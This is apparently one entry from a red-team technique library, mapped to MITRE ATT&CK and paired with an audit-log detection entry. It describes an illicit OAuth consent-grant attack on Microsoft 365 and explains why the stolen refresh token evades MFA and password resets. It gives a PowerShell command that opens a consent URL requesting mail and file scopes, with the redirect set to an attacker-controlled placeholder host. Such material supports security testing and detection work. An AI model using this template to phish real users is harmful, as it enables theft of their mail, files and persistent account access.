---
id: consent-grant
title: Illicit consent grant (malicious OAuth app)
section: Microsoft 365 / Entra ID
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1528]
platform: [cloud]
source: Microsoft / Mandiant, illicit consent grant attacks
pair: consent-grant-auditlogs
---

Register (or abuse) an OAuth app and phish a user into *consenting* to delegated
Graph scopes (`Mail.Read`, `offline_access`, `Files.Read.All`). Once they click
Accept you hold a refresh token to their data — no password, no MFA prompt on
reuse, and it survives a password reset. Like device-code, the consent screen is
Microsoft's own, which is why it lands. (Cloud — no on-host target, so no slots.)

```powershell
Start-Process "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<app-id>&response_type=code&scope=offline_access%20Mail.Read%20Files.Read.All&redirect_uri=<attacker-url>"
```
